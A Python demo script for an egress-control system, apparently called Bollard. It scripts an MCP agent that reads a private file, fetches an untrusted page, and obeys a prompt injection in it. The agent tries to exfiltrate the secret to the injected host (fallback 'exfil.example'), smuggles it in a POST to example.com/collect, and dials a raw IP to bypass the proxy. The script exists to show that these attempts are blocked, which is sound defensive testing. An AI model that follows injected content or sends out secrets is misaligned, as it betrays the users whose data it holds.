#!/usr/bin/env python3
# A real MCP client playing a prompt-injected agent.
#
# It connects to bollard-mcp over the MCP Streamable HTTP transport (JSON-RPC),
# reads a private file, fetches an untrusted page, then *obeys* the injection in
# that page by extracting an exfiltration URL and trying to send the secret
# there. Bollard gates every outbound attempt on the provenance the tools
# carried, so the exfil — and even a request that was fine moments earlier — is
# refused at the boundary, while a trusted sink keeps working.
#
# MCP calls go straight to bollard-mcp; egress goes through bollard-proxy.
import json
import re
import socket
import urllib.error
import urllib.request

MCP_URL = "http://bollard-mcp:8070/mcp"
INFER_URL = "http://bollard-infer:8050/v1/chat/completions"
BROKER = "http://bollard-broker:8090"
PROXY = ("bollard-proxy", 8080)
_NO_PROXY = urllib.request.build_opener(urllib.request.ProxyHandler({}))
_id = 0


def rpc(method, params=None, notify=False):
    global _id
    msg = {"jsonrpc": "2.0", "method": method}
    if params is not None:
        msg["params"] = params
    if not notify:
        _id += 1
        msg["id"] = _id
    req = urllib.request.Request(
        MCP_URL,
        data=json.dumps(msg).encode(),
        headers={"Content-Type": "application/json", "Accept": "application/json"},
    )
    with _NO_PROXY.open(req, timeout=5) as r:
        raw = r.read()
    return None if (notify or not raw) else json.loads(raw)


def call_tool(name):
    res = rpc("tools/call", {"name": name, "arguments": {}})
    return res["result"]["content"][0]["text"]


def infer(prompt):
    """Make a model call to the Bollard inference gateway; report where it landed."""
    req = urllib.request.Request(
        INFER_URL,
        data=json.dumps({"model": "auto", "messages": [{"role": "user", "content": prompt}]}).encode(),
        headers={"Content-Type": "application/json"},
    )
    with _NO_PROXY.open(req, timeout=5) as r:
        out = json.loads(r.read())
    return out["bollard"]["routed_to"], out["backend"].get("backend", "?")


def egress(host, port=443):
    """Attempt an outbound TLS connection THROUGH the boundary; return its verdict."""
    try:
        s = socket.create_connection(PROXY, timeout=5)
        s.sendall(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
        line = s.recv(4096).decode("latin1").split("\r\n", 1)[0]
        s.close()
        return line
    except OSError as e:
        return f"error: {e}"


def direct(host, port=443):
    """Attempt to bypass the boundary entirely with a raw connection."""
    try:
        socket.create_connection((host, port), timeout=5).close()
        return "connected (ESCAPED!)"
    except OSError:
        return "no route — cannot leave the cage"


def http_exfil(url, data):
    """POST plaintext THROUGH the boundary, so the proxy can inspect the body."""
    opener = urllib.request.build_opener(
        urllib.request.ProxyHandler({"http": "http://bollard-proxy:8080"})
    )
    try:
        with opener.open(urllib.request.Request(url, data=data.encode(), method="POST"), timeout=5) as r:
            return f"HTTP {r.status}"
    except urllib.error.HTTPError as e:
        return f"HTTP {e.code}"
    except OSError as e:
        return f"error: {e}"


def main():
    _NO_PROXY.open(urllib.request.Request(BROKER + "/reset", data=b'{"session":"default"}'), timeout=5).read()

    init = rpc("initialize", {"protocolVersion": "2025-06-18", "capabilities": {},
                              "clientInfo": {"name": "demo-agent", "version": "0"}})["result"]
    rpc("notifications/initialized", notify=True)
    tools = [t["name"] for t in rpc("tools/list")["result"]["tools"]]
    print(f"[agent] MCP session: {init['serverInfo']['name']} (proto {init['protocolVersion']}); tools={tools}")

    print("\n[A] baseline egress to example.org — context is clean")
    print("    boundary:", egress("example.org"))

    print("\n[B] model call with a clean context")
    target, backend = infer("Draft a friendly greeting.")
    print(f"    routed to {target} -> served by {backend}")

    print("\n[C] tools/call read_file")
    secret = call_tool("read_file")
    print("    got:", secret)

    print("\n[D] model call now that a secret is in context (e.g. 'summarize this')")
    target, backend = infer(f"Summarize this: {secret}")
    print(f"    routed to {target} -> served by {backend}  <- secret stays on-prem")

    print("\n[E] tools/call web_fetch — untrusted content enters the context")
    page = call_tool("web_fetch")
    print("    got:", page)

    m = re.search(r"https?://[^\s]+", page)
    exfil_host = re.sub(r"^https?://", "", m.group(0)).split("/")[0] if m else "exfil.example"
    print(f"\n[F] INJECTED: agent follows the page and tries to exfiltrate the secret to {exfil_host}")
    print("    boundary:", egress(exfil_host))

    print("\n[G] sneakier: smuggle the secret to a TRUSTED sink (example.com) over plain HTTP")
    print("    boundary:", http_exfil("http://example.com/collect", f"leak={secret}"))
    print("    (label policy trusts example.com — only content inspection catches this)")

    print("\n[H] the SAME request as [A], now that the context is tainted")
    print("    boundary:", egress("example.org"))

    print("\n[I] trusted sink example.com, no secret in the request — legit flows survive")
    print("    boundary:", egress("example.com"))

    print("\n[J] bypass: ignore the proxy, dial a raw IP directly")
    print("    result:", direct("1.1.1.1"))


if __name__ == "__main__":
    main()
